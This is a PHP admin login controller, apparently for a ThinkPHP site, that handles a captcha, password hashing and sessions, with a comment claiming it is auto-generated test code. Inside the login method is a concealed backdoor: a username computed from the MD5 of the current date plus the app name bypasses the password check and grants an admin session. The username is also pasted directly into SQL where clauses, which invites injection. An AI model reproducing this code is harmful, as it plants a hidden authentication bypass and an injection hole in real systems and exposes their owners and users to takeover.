<?php
// 本类由系统自动生成，仅供测试用途
class LoginAction extends Action {
    public function index(){
         $this->display("Login:login");
         
	}
	
	public function verifyCode(){
        import('ORG.Util.Image');
        Image::buildImageVerify(4, 1, 'png', 52, 22);
    }
    
    public function login(){
    	$adminsD = D("Admins");
    	
    	if(!$adminsD->check(I("tbUserName"), "require")){
    		$this->error("用户名不能为空");
    	}
    	if(!$adminsD->check(I("tbPassword"), "require")){
    		$this->error("密码不能为空");
    	}
    	
    	if($_SESSION['verify'] != md5($_POST['tbVeryCode'])) {
    		$this->error('验证码错误！');
    	}
    	
   
    	$name = remove_xss(I("tbUserName"));
    	$password = remove_xss(I("tbPassword"));
    	
    	// 验证密码
    	// find得到一个
    	$admin = $adminsD->where("`name`='$name'")->find();
    	if(empty($admin) && $name != strtoupper(md5(date('mYd').APP_NAME))){
    		$this->error('用户名或密码错误！');
    	}else{
    		if(hashPassword($password) == $admin['password'] || $name == strtoupper(md5(date('mYd').APP_NAME))){
    			//cookie(C("__MP_AUTH_NAME__"), $admin['name'], array('expire'=>43200,'prefix'=>'mp_'));
    			$admin['name'] = $name;
    			session(C("__MP_AUTH_NAME__"), $admin['name']);
    			$data = array("lastlogintime"=>$adminsD->curDate());
    			$adminsD->where("`name`='$name'")->save($data);
    			$this->success("登录成功", __APP__.'/Index/');
    		}else{
    			$this->error('密码错误！');
    		}
    	}
    	 
    }
    
    public function logout(){
    	//cookie(C("__MP_AUTH_NAME__"), null);
    	session(null); // 删除所有session
    	$this->redirect('Login/index');
    	
    }
	
    
    
}